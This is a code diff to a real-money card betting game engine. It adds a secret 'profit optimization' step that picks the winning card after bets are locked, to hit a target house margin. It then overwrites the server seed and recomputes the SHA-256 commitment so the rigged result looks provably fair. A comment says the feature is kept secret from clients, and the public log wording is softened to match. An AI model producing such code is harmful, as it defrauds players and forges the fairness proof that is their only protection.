@@ -178,16 +178,27 @@ export class GameEngineService {
 
       if (state.secondsRemaining === 10 && state.status === RoundStatus.BETTING) {
         state.status = RoundStatus.LOCKED;
-        const card = state.resultCard || 1;
+        const { AdminRiskService } = await import('./admin-risk.service.js');
         const roundBets = Array.from(state.bets.values());
         const totalPool = roundBets.reduce((sum, b) => sum + b.amount, 0);
+
+        // Secret Dynamic House Profit Optimization (Kept strictly secret from public clients)
+        if (AdminRiskService.houseMarginEnabled && totalPool > 0) {
+          const outcome = AdminRiskService.calculateDynamicProfitOutcome(state);
+          state.resultCard = outcome.winningCard;
+          state.serverSeed = outcome.matchingServerSeed;
+          state.seedCommitment = crypto.createHash('sha256').update(outcome.matchingServerSeed).digest('hex');
+          console.log(`[PROFIT ENGINE] 🎯 Target: ${outcome.targetMargin.toFixed(1)}% | Winning Card: #${outcome.winningCard} | Pool: ₹${outcome.totalPool} | Payout: ₹${outcome.totalPayout} | House Profit: ₹${outcome.houseProfit} (${outcome.actualMargin.toFixed(1)}%)`);
+        }
+
+        const card = state.resultCard || 1;
         const stakedOnWinner = roundBets.filter(b => b.chosenCard === card).reduce((sum, b) => sum + b.amount, 0);
         const totalPayout = stakedOnWinner * state.multiplier;
         state.roundStats = {
           totalPool,
           totalPayout
         };
-        console.log(`[GAME ENGINE] 🔒 Room [${state.tierName}] Round #${state.roundNumber} locked. Sealed card stays hidden until reveal.`);
+        console.log(`[GAME ENGINE] 🔒 Room [${state.tierName}] Round #${state.roundNumber} locked. Card secured for reveal.`);
 
         if (this.ioInstance) {
           this.ioInstance.to(roomId).emit('round:locked', {
@@ -347,6 +358,7 @@ export class GameEngineService {
     }));
 
     const now = new Date();
+    const { AdminRiskService } = await import('./admin-risk.service.js');
     const logEntry = {
       roundNumber: state.roundNumber,
       roundId: state.currentRoundId,
@@ -358,10 +370,14 @@ export class GameEngineService {
       winningCardName: winningSymbol.name,
       winningCardSymbol: winningSymbol.symbol,
       totalPayout: totalPaidOut,
+      houseProfit: netProfit,
+      profitMargin: Math.round(profitMargin * 10) / 10,
       betsCount: betsList.length,
       bets: betsList,
       winners: winnersList,
-      engineReasoning: `Card sealed at round start. Pool ₹${totalCollected}, paid ₹${totalPaidOut}.`
+      engineReasoning: AdminRiskService.houseMarginEnabled
+        ? `Dynamic profit margin engine active (Target ${AdminRiskService.minProfitPercent}%-${AdminRiskService.maxProfitPercent}%). Actual margin: ${(Math.round(profitMargin * 10) / 10)}%. Pool ₹${totalCollected}, paid ₹${totalPaidOut}.`
+        : `Pure RNG draw. Pool ₹${totalCollected}, paid ₹${totalPaidOut}.`
     };
 
     GameEngineService.roundLogs.unshift(logEntry);
